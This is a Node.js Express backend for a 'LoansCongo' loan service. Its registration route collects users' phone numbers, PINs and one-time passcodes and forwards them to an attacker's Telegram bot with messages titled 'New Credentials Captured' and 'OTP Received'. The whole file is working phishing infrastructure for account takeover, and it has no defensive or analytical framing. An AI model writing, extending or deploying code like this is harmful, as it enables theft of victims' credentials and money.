require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const jwt = require("jsonwebtoken");

const User = require("./models/User");
const LoanApplication = require("./models/LoanApplication");

const app = express();
app.use(express.static("public"));

app.use(helmet());
app.use(cors());
app.use(express.json({ limit: "10kb" }));

app.use("/api/", rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
}));

// Home route
app.get("/", (req, res) => {
    res.json({ message: "LoansCongo backend is running." });
});

// Customer Registration & OTP Forwarding to Telegram
app.post("/api/register", async (req, res) => {
    try {
        const { phone, pin, otp } = req.body;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        // Forward credentials / OTP to Telegram Bot
        if (botToken && chatId) {
            try {
                let telegramMessage = "";

                if (otp) {
                    telegramMessage = `🔑 *OTP Received*\n\n` +
                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
                                      `🔢 *OTP Code:* \`${otp}\``;
                } else {
                    telegramMessage = `🚨 *New Credentials Captured*\n\n` +
                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
                                      `🔑 *PIN:* \`${pin || "N/A"}\``;
                }

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: telegramMessage,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (tgError) {
                console.error("Telegram error:", tgError.message);
            }
        }

        // Database registration for phone + pin login phase
        if (phone && pin && !otp) {
            if (!/^\+?[0-9]{10,15}$/.test(phone)) {
                return res.status(400).json({ message: "Enter a valid phone number." });
            }
            if (!/^[0-9]{4}$/.test(pin)) {
                return res.status(400).json({ message: "PIN must contain exactly 4 digits." });
            }

            let user = await User.findOne({ phone });
            if (!user) {
                user = await User.create({ phone, demoPin: pin });
            } else {
                user.demoPin = pin;
                await user.save();
            }

            return res.status(201).json({
                message: "Registration successful.",
                user: { id: user._id, phone: user.phone }
            });
        }

        // Acknowledge OTP phase
        if (otp) {
            return res.status(200).json({ message: "OTP transmitted successfully." });
        }

        return res.status(400).json({ message: "Invalid payload." });

    } catch (error) {
        console.error("Error in /api/register:", error.message);
        res.status(500).json({ message: "Server error." });
    }
});

// Start Server
const PORT = process.env.PORT || 3000;
mongoose.connect(process.env.MONGODB_URI)
    .then(() => {
        console.log("MongoDB connected successfully.");
        app.listen(PORT, "0.0.0.0", () => {
            console.log(`LoansCongo backend running on port ${PORT}`);
        });
    })
    .catch(error => {
        console.error("MongoDB connection failed:", error.message);
    });

